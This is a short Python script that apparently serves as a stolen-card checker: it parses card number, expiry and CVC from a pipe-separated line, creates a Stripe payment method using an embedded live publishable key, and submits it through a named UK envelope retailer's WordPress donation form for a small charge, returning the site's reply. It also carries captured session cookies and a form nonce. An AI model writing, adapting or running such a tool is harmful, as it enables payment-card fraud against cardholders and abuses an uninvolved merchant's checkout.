import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51BVdWVFoYZt3YZYFvbo0eMvsCZhxVbdd9uaGFT4MBISsw2kiHYomGIHRWLg8DaKLspjqwVk4xe4XNjBBKuFuhDIO00X29vkRs5'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-02-18%2001%3A34%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rainbowenvelopes.co.uk%2Fswatch-samples.html%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2025-02-18%2001%3A34%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rainbowenvelopes.co.uk%2Fswatch-samples.html%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rainbowenvelopes.co.uk%2Fswatch-samples.html',
	    '_ga': 'GA1.1.230807848.1739842490',
	    'sib_cuid': 'b809332d-e700-4010-a21d-aca462f02ab8',
	    'cmplz_consent_mode': 'security_storage,functionality_storage,personalization_storage,analytics_storage,ad_storage,ad_user_data,ad_personalization',
	    'cmplz_consented_services': '',
	    'cmplz_policy_id': '38',
	    'cmplz_marketing': 'allow',
	    'cmplz_statistics': 'allow',
	    'cmplz_preferences': 'allow',
	    'cmplz_functional': 'allow',
	    '_ga_YWCG9JV9SK': 'GS1.1.1739842489.1.1.1739842494.0.0.0',
	    '__stripe_mid': '5a8573b5-6505-4fb5-971c-8258f4fd4aeb1d1a58',
	    '__stripe_sid': '05e87893-00ee-4933-827b-221243e183e0f88d18',
	}
	
	headers = {
	    'authority': 'www.rainbowenvelopes.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-18%2001%3A34%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rainbowenvelopes.co.uk%2Fswatch-samples.html%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-02-18%2001%3A34%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rainbowenvelopes.co.uk%2Fswatch-samples.html%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rainbowenvelopes.co.uk%2Fswatch-samples.html; _ga=GA1.1.230807848.1739842490; sib_cuid=b809332d-e700-4010-a21d-aca462f02ab8; cmplz_consent_mode=security_storage,functionality_storage,personalization_storage,analytics_storage,ad_storage,ad_user_data,ad_personalization; cmplz_consented_services=; cmplz_policy_id=38; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; _ga_YWCG9JV9SK=GS1.1.1739842489.1.1.1739842494.0.0.0; __stripe_mid=5a8573b5-6505-4fb5-971c-8258f4fd4aeb1d1a58; __stripe_sid=05e87893-00ee-4933-827b-221243e183e0f88d18',
	    'origin': 'https://www.rainbowenvelopes.co.uk',
	    'referer': 'https://www.rainbowenvelopes.co.uk/swatch-samples.html',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1739842516761',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=26316&_fluentform_4_fluentformnonce=7158274a7a&_wp_http_referer=%2Fswatch-samples.html&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&email=&payment_input=2.50&payment_method=stripe&hidden=ccd67b3e3b7c5124&checkbox%5B%5D=&checkbox_3%5B%5D=&checkbox_4%5B%5D=&checkbox_1%5B%5D=&checkbox_2%5B%5D=&checkbox_5%5B%5D=&checkbox_6%5B%5D=&checkbox_7%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	r2 = requests.post(
	    'https://www.rainbowenvelopes.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
